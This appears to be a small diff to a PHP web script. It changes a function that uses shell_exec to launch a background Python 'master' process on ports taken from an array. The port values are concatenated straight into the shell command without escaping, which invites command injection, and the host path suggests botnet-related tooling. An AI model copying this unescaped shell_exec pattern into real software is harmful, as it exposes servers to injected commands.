@@ -81,8 +81,7 @@ function outputQueryResults($mysqli) {
 
 function spawnTheMaster($array){
 
-	$q =shell_exec('nohup /usr/bin/python3 /var/www/ports.botnet.biz/web/master.py -m 0.0.0.0:'.$array["port"].' -c 0.0.0.0:'.$array["connection_port"].' > /dev/null 2>&1 &');
-	echo $q;
+	shell_exec('nohup /usr/bin/python3 /var/www/ports.botnet.biz/web/master.py -m 0.0.0.0:'.$array["port"].' -c 0.0.0.0:'.$array["connection_port"].' > /dev/null 2>&1 &');
 }
  
 
